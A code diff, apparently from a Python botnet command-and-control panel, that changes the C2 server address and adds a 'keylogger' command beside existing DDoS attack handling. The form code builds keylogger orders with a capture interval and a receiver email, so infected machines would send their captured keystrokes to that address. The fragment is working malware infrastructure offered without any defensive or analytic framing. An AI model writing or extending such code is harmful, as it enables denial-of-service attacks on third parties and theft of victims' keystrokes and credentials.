@@ -48,7 +48,7 @@ def print_debug(str):
 #endregion
 		
 # Server info
-ippp 	= "192.168.0.22"
+ippp 	= "192.168.0.2"
 port 	= 1888
 
 #region Variables
@@ -290,6 +290,9 @@ def _take_cmd(bot, cmd):
 
 	elif "attack" in cmd:
 		return call_script(bot, cmd)
+
+	elif "keylogger" in cmd:
+		return call_script(bot, cmd)
 	
 
 
@@ -368,6 +371,10 @@ def command_check(command):
 		ddos_thread 	= request.form.get('ddos-ip-thread')
 		return (f'{command} {ddos_method} {ddos_target} {ddos_port} {ddos_thread} {ddos_time}')
 
+	elif command == "keylogger":
+		keylogger_intervals 		= request.form.get('keylogger-intervals')
+		keylogger_reciever_email 	= request.form.get('keylogger-reciever-email')
+		return (f'{command} {keylogger_intervals} {keylogger_reciever_email}')
 
 	else: return command
 
